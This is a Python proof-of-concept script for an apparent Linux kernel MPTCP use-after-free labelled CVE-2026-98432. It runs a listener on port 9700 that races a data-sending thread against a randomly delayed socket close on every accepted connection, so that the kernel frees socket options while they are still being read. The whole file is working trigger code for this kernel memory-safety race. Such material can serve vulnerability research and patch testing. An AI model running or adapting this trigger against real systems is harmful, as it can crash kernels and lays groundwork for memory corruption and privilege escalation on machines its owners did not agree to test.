import socket, threading, time, random
# CVE-2026-98432 mode-1 target service: accepts MPTCP connections and, per
# connection, streams data (the ip_queue_xmit reader of child->inet_opt) on
# one thread while a second thread closes the socket after a short delay
# (the inet_sock_destruct free). Python releases the GIL inside C send(),
# so the two threads genuinely run on different CPUs -> the kfree() in
# close() can land inside the sender's ip_options_build window.
def serve(c):
    ev = threading.Event()
    def sender():
        try:
            while not ev.is_set():
                if c.send(b"A" * 1460) <= 0:
                    break
        except OSError:
            pass
    def closer():
        time.sleep(0.05 + random.random() * 0.10)
        try:
            c.close()
        except OSError:
            pass
        ev.set()
    threading.Thread(target=sender, daemon=True).start()
    threading.Thread(target=closer, daemon=True).start()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 262)  # IPPROTO_MPTCP
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 9700))
s.listen(256)
print("MPTCP racing listener on :9700", flush=True)
while True:
    try:
        c, a = s.accept()
        threading.Thread(target=serve, args=(c,), daemon=True).start()
    except OSError:
        pass
